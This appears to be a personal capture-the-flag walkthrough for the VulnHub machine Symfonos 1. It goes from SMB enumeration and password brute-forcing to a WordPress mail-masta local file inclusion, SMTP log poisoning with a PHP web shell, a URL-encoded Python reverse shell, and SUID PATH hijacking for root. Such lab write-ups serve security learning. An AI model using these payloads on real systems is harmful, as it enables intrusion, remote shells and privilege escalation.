# NMAP Scan
- tcp/22
- tcp/80
- tcp/139,445
- udp/137

# Port 139,445 (SMB)
1. Ran enum4linux-ng
	![[Symfonos1 enum4linux-ng .png]]
	- Store them in wordlist
		- usernames.txt
			- helios
			- Helios
	- Save user `helios` into a wordlist `usernames.txt`
1. Ran crackmapexec 
	![[Symfonos1 crackmapexec.png]]
	- Able to read `anonymous` fileshare
3. Download all files from `anonymous` fileshare
	```
	smbclient //$ip/anonymous -c 'prompt;recurse;mget *'
	```
	![[Symfonos1 anonymous dir.png]]
	- Store them in wordlists
		- usernames.txt
			- Zeus
			- zeus
		- passwords.txt
			- epidioko
			- qwerty
			- baseball
4. Bruteforce SMB 
	- https://github.com/yufongg/SMB-Fileshare-Bruteforce/blob/main/smb_fileshare_bruteforce.sh
	![[Symfonos1 smb fileshare bruteforce.png]]
5. Download all files from `helios` fileshare
	```
	smbclient //$ip/helios -U helios -c 'prompt;recurse;mget *'
	```
	![[Bob 1.0.1 helios fileshare dir.png]]

# Port 80 (HTTP) - Wordpress Plugin LFI
1. Feroxbuster did not enumerate any interesting dirs
	![[Symfonos1 feroxbuster.png]]
2. Proceed to `/h3l105`
	- Found wordpress site
	![[Symfonos1 wordpress site.png]]
3. Enumerate wordpress users
	```
	wpscan --no-update --disable-tls-checks --url http://symfonos.local/h3l105 -e u -f cli-no-color 2>&1 | tee "/root/vulnHub/Symfonos-1/192.168.56.123/scans/tcp80/tcp_80_http_wpscan_user_enum.txt"
	```
	![[Symfonos1 wordpress user enum.png]]
	- admin
4. Enumerate wordpress plugins
	```
	wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url http://symfonos.local/h3l105 -e ap -f cli-no-color 2>&1 | tee "/root/vulnHub/Symfonos-1/192.168.56.123/scans/tcp80/tcp80_http_wpscan_plugin_enum.txt"
	```
	![[Symfonos1 wordpress plugins enum.png]]
	- akismet
		- 4.1.2
	- mail-masta
		- 1.0
	- site-editor
		- 1.1.1
5. Bruteforce admin
	```
	wpscan --no-update --disable-tls-checks --wp-content-dir wp-admin --url http://symfonos.local/h3l105 --usernames admin --passwords /usr/share/wordlists/rockyou.txt -f cli-no-color 2>&1 | tee "/root/vulnHub/Symfonos-1/192.168.56.123/scans/tcp80/tcp_80_http_wpscan_bruteforce.txt"
	```
	- Bruteforce failed
6. Search for exploits
	- site-editor 1.1.1
		![[Symfonos1 site editor exploit.png]]
	- mail-masta
		![[Symfonos1 mail masta exploit.png]]
7. Manually exploit mail-masta, 
	1. Exploitable parameter 
		```
		http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=<LFI File>
		```
	2. Include `/etc/passwd`
		```
		http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
		```
		![[Symfonos1 included passwd file.png]]
	3. Since SMTP (tcp/25) is up, we can do SMTP log poisoning
	4. Poison mail log
		```
		telnet 192.168.1.119 25
		MAIL FROM:asdf
		RCPT TO: helios
		DATA
		<?php system($_GET['c']); ?>
		.
		QUIT
		```
	5. Include mail log file & test RCE
		```
		http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id;
		```
		![[Symfonos1 LFI2RCE.png]]
		6. Obtain helios shell
		```
		http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=which+python;
		```
		```
		http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=python%20-c%20%27a%3D__import__%3Bs%3Da%28%22socket%22%29.socket%3Bo%3Da%28%22os%22%29.dup2%3Bp%3Da%28%22pty%22%29.spawn%3Bc%3Ds%28%29%3Bc.connect%28%28%22192.168.56.103%22%2C4444%29%29%3Bf%3Dc.fileno%3Bo%28f%28%29%2C0%29%3Bo%28f%28%29%2C1%29%3Bo%28f%28%29%2C2%29%3Bp%28%22%2Fbin%2Fsh%22%29%27
		```
		![[Symfonos helios shell obtained.png]]

# Privilege Escalation via SUID Binary
1. Check for SUID binaries
	![[Pasted image 20220114174813.png]]
	- unknown binary
2. Check the contents `/opt/statuscheck` w/ strings
	![[Pasted image 20220114174912.png]]
3. Since full path of curl is not specified, path hijacking exploit can be used
	1.  Prepend `/tmp` to your PATH 
		```
		export PATH=/tmp:$PATH
		```
	2. Create `curl` binary
		```
		echo "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash" > curl; chmod +x curl;
		```
		- Since `/tmp` is in your first PATH, `curl` from `/tmp` will be used.
	3. Obtain root shell
		```	
		/opt/statuscheck
		/tmp/rootbash -p
		```
4. Root obtained
	![[Symfonos1 root shell obtained.png]]
	
	
	
	
---
Tags: #tcp/80-http/cms/wordpress-plugin #exploit/file-inclusion/lfi #tcp/80-http/rce #linux-priv-esc/suid/unknown-exec #linux-priv-esc/suid/path-hijacking 

---

	


